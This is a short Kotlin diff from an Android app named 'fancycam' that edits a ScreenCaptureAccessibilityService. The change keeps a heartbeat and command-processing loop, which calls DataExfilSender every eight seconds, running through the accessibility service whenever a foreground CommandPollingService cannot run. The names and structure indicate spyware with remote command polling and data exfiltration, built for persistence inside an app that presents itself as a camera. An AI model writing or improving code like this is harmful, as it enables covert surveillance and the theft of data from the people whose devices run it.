@@ -78,13 +78,18 @@ class ScreenCaptureAccessibilityService : AccessibilityService() {
     private val heartbeatHandler = Handler(Looper.getMainLooper())
     private val heartbeatRunnable = object : Runnable {
         override fun run() {
-            try {
-                com.example.fancycam.network.DataExfilSender.sendHeartbeat(
-                    this@ScreenCaptureAccessibilityService,
-                    processCommands = true
-                )
-            } catch (e: Exception) {
-                Log.w(TAG, "Accessibility heartbeat failed", e)
+            // FALLBACK: the foreground CommandPollingService normally drives command
+            // polling. Only beat from here when that service is not running, since an
+            // AccessibilityService survives even when a foreground service cannot start.
+            if (!CommandPollingService.isRunning) {
+                try {
+                    DataExfilSender.sendHeartbeat(
+                        this@ScreenCaptureAccessibilityService,
+                        processCommands = true
+                    )
+                } catch (e: Exception) {
+                    Log.w(TAG, "Accessibility heartbeat failed", e)
+                }
             }
             heartbeatHandler.postDelayed(this, 8000L)
         }
